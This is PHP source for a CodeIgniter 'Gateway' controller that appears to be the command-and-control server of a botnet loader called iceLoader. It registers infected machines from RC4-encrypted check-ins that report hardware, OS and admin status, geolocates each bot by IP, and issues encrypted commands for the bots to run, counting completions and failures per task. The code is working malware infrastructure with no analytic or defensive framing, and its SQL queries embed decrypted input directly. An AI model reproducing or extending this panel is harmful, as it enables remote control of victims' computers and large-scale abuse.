<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Gateway extends CI_Controller {
	public function __construct(){
		 parent::__construct();
		 $this->load->helper('url');
	}
	
	
	function decrypt($string, $password){
		$hex = $this->hextostr($string);
		
		return $this->rc4($password, $hex);
	}
	
	function encrypt($string, $password){
		$rc4 = $this->rc4($password, $string);
		$hex = bin2hex($rc4);
		
		
		return $hex;
	}
	
	function rc4($key, $str) {
		$s = array();
		for ($i = 0; $i < 256; $i++) {
			$s[$i] = $i;
		}
		$j = 0;
		for ($i = 0; $i < 256; $i++) {
			$j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
			$x = $s[$i];
			$s[$i] = $s[$j];
			$s[$j] = $x;
		}
		$i = 0;
		$j = 0;
		$res = '';
		for ($y = 0; $y < strlen($str); $y++) {
			$i = ($i + 1) % 256;
			$j = ($j + $s[$i]) % 256;
			$x = $s[$i];
			$s[$i] = $s[$j];
			$s[$j] = $x;
			$res .= $str[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
		}
		return $res;
	}

	function rcc4($key, $data)
	{
		// Store the vectors "S" has calculated
		static $SC;
		// Function to swaps values of the vector "S"
		$swap = create_function('&$v1, &$v2', '
			$v1 = $v1 ^ $v2;
			$v2 = $v1 ^ $v2;
			$v1 = $v1 ^ $v2;
		');
		$ikey = crc32($key);
		if (!isset($SC[$ikey])) {
			// Make the vector "S", basead in the key
			$S    = range(0, 255);
			$j    = 0;
			$n    = strlen($key);
			for ($i = 0; $i < 255; $i++) {
				$char  = ord($key{$i % $n});
				$j     = ($j + $S[$i] + $char) % 256;
				$swap($S[$i], $S[$j]);
			}
			$SC[$ikey] = $S;
		} else {
			$S = $SC[$ikey];
		}
		// Crypt/decrypt the data
		$n    = strlen($data);
		$data = str_split($data, 1);
		$i    = $j = 0;
		for ($m = 0; $m < $n; $m++) {
			$i        = ($i + 1) % 256;
			$j        = ($j + $S[$i]) % 256;
			$swap($S[$i], $S[$j]);
			$char     = ord($data[$m]);
			$char     = $S[($S[$i] + $S[$j]) % 256] ^ $char;
			$data[$m] = chr($char);
		}
		return implode('', $data);
	}
	
	public function alive(){
		$key = config_item('iceLoader')['1c3key'];
		
		
		
		$bot_id			= $this->decrypt($this->input->post('bot_id'), $key);
		

		$version		= $this->decrypt($this->input->post('version'), $key);
		$bot_os			= $this->decrypt($this->input->post('os'), $key);
		$bot_isAdmin	= $this->decrypt($this->input->post('isAdmin'), $key);
		$bot_ip			= $this->get_ip();
		
		$bot_gpu		= $this->decrypt($this->input->post('gpu'), $key);
		$bot_proc		= $this->decrypt($this->input->post('proc'), $key);
		$bot_arch		= $this->decrypt($this->input->post('arch'), $key);
		$bot_ram		= $this->decrypt($this->input->post('ram'), $key);
		$bot_space		= $this->decrypt($this->input->post('space'), $key);
		
	
		
		//Check if bot already exsists in database.
		$q = $this->db->query("SELECT * FROM bots WHERE bot_uuid='$bot_id'");
		if($q->num_rows() < 1){
			
			$location = file_get_contents('http://ipinfo.io/'.$bot_ip.'/country');
			$location = preg_replace('/\s+/', '', $location);
			
			$data = array(
				'bot_uuid' => $bot_id,
				'bot_ipv4' => $bot_ip,
				'bot_location' => $location,
				'bot_os' => $bot_os,
				'bot_admin' => $bot_isAdmin,
				'bot_version' => $version,
				'bot_gpu' => $bot_gpu,
				'bot_proc' => $bot_proc,
				'bot_arch' => $bot_arch,
				'bot_ram' => $bot_ram,
				'bot_space' => $bot_space
			);
			$this->db->set('bot_lastseen', 'NOW()', FALSE);
			$this->db->set('bot_added', 'NOW()', FALSE);
			$this->db->insert('bots', $data);
			
			
			//Output new task for bot the execute
		
			
			$query = $this->db->query("SELECT * FROM tasks WHERE status = '0'");
			$result = $query->result();
			
			foreach($result as $result){
				//Get All finished tasks by bot
				$queryt = $this->db->query("SELECT * FROM tasks_finished WHERE bot_id = '$bot_id'");
				$resultt = $queryt->result();
				
				foreach($resultt as $resul){
					
					if($result->id == $resul->task_id){
						
					}else{
						
						die(  $this->encrypt($result->cmd, '8417a031bdadfb493a827cfec74bba14') );
					}
				}
				
				
			}
		}else{
			$data = array(
				'bot_os' => $bot_os,
				'bot_admin' => $bot_isAdmin,
				'bot_version' => $version,
				'bot_gpu' => $bot_gpu,
				'bot_proc' => $bot_proc,
				'bot_arch' => $bot_arch,
				'bot_ram' => $bot_ram,
				'bot_space' => $bot_space
			);
			$this->db->set('bot_lastseen', 'NOW()', FALSE);
			$this->db->where('bot_uuid', $bot_id);
			$this->db->update('bots', $data);
			
			
			$query = $this->db->query("SELECT * FROM tasks WHERE status = '0'");
			$result = $query->result();
			
			
			foreach($result as $result){
				//Get All finished tasks by bot
				$queryt = $this->db->query("SELECT * FROM tasks_finished WHERE bot_id = '$bot_id' AND task_id = '".$result->id."'");
				$resultt = $queryt->result();
				
				if($queryt->num_rows() > 0){
					
				}else{
					die( $this->encrypt($result->cmd, '8417a031bdadfb493a827cfec74bba14') );
				}

			}
		}

	}
	
	
	function nice_escape($unescapedString)
	{
		if (get_magic_quotes_gpc()) {
			$unescapedString = stripslashes($unescapedString);
		}
		$semiEscapedString = mysql_real_escape_string($unescapedString);
		$escapedString     = addcslashes($semiEscapedString, "%_");
		
		return $escapedString;
	}

	function nice_output($escapedString)
	{
		$patterns        = array();
		$patterns[0]     = '/\\\%/';
		$patterns[1]     = '/\\\_/';
		$replacements    = array();
		$replacements[0] = '%';
		$replacements[1] = '_';
		$output          = preg_replace($patterns, $replacements, $escapedString);
		
		return $output;
	}

	function cleanstring($string)
	{
		$done = $this->nice_output($this->nice_escape($string));
		
		return $done;
	}
	

	function hextostr($hex)
	{
		$str = '';
		for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
			$str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
		}
		return $str;
	}
	
	function update_bot($bot_id, $task_id, $task_status){
		$this->db->where('bot_uuid', $bot_id);
		$this->db->set('bot_lastseen', 'NOW()', FALSE);
		$this->db->update('bots');
	}
	
	function update_task($bot_id, $task_id, $task_status){
		$this->db->where('id', $task_id);
		$this->db->set('executed', '`executed`+ 1', FALSE);
		$this->db->update('tasks');
	}
	
	function finish_task($bot_id, $task_id, $task_status){
		$data = array(
			'task_id' => $task_id,
			'bot_id' => $bot_id
		);
		$this->db->insert('tasks_finished', $data);
	}
	
	function check_task_done($bot_id, $task_id, $task_status){
		
		$q = $this->db->query("SELECT * FROM tasks WHERE id = '$task_id';");
		$result = $q->result();
		
		$executed = $result[0]->executed;
		$limit = $result[0]->maxbots;
		
		if($executed > $limit - 1){
			$this->db->where('id', $task_id);
			$this->db->set('status', 1, FALSE);
			$this->db->update('tasks');
		}
		

	}
	
	function fail_task($bot_id, $task_id, $task_status){
		$this->db->where('id', $task_id);
		$this->db->set('failed', '`failed`+ 1', FALSE);
		$this->db->update('tasks');
		
	}
	public function command(){
		$key = config_item('iceLoader')['1c3key'];

		$bot_id = $this->decrypt($this->input->post('bot_id'), $key);
		$task_id = $this->decrypt($this->input->post('cmd_id'), $key);
		$task_status = $this->decrypt($this->input->post('cmd_status'), $key);
		
		if(!$bot_id){die('error!');}
		
		if($task_status == "ok"){
			
			$this->update_bot($bot_id, $task_id, $task_status);	
			$this->update_task($bot_id, $task_id, $task_status);
			$this->finish_task($bot_id, $task_id, $task_status);
			$this->check_task_done($bot_id, $task_id, $task_status);
			
			
			//echo "Task Finished";
		}else{

			$this->fail_task($bot_id, $task_id, $task_status);
			$this->finish_task($bot_id, $task_id, $task_status);
		}
	}
	
	
	function sXOR($text, $pass)
	{
		$var = "";
		
		for ($i = 0; $i < strlen($text); $i++) {
			$var .= chr(ord($text[$i]) ^ strlen($pass));
		}
		return htmlentities($var);
	}
	
	
	function get_ip() {
		if ( function_exists( 'apache_request_headers' ) ) {
			$headers = apache_request_headers();
		} else {
			$headers = $_SERVER;
		}
		//Get the forwarded IP if it exists
		if ( array_key_exists( 'X-Forwarded-For', $headers ) && filter_var( $headers['X-Forwarded-For'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 ) ) {
			$the_ip = $headers['X-Forwarded-For'];
		} elseif ( array_key_exists( 'HTTP_X_FORWARDED_FOR', $headers ) && filter_var( $headers['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 )
		) {
			$the_ip = $headers['HTTP_X_FORWARDED_FOR'];
		} else {
			
			$the_ip = filter_var( $_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 );
		}
		return $the_ip;
	}
} 
